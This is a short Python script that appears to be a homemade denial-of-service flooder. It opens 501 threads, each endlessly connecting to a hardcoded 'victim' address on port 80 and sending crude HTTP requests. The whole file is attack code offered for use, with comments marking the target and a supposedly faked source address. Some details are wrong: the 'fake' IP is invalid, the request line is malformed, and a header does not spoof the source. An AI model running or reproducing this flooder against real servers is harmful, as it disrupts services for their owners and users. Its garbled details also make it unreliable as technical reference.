#!/bin/python3

import threading
import socket

deadboi = '192.168.8.1' #ip of vic
port = 80
notmyip = '192.805.9.5' #fake ip for yourself

connections = 0

def death():
    while True:
        sockboi = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sockboi.connect((deadboi, port))
        sockboi.sendto(("GET /" + deadboi + "HTTP/1.1\r\n").encode("ascii"), (deadboi, port))
        sockboi.sendto(("Hosts: " + notmyip + "\r\n\r\n").encode("ascii"), (deadboi, port))
        sockboi.close()
        global connections
        connections += 1
        

for i in range(501):
    threadboi = threading.Thread(target=death)
    threadboi.start()
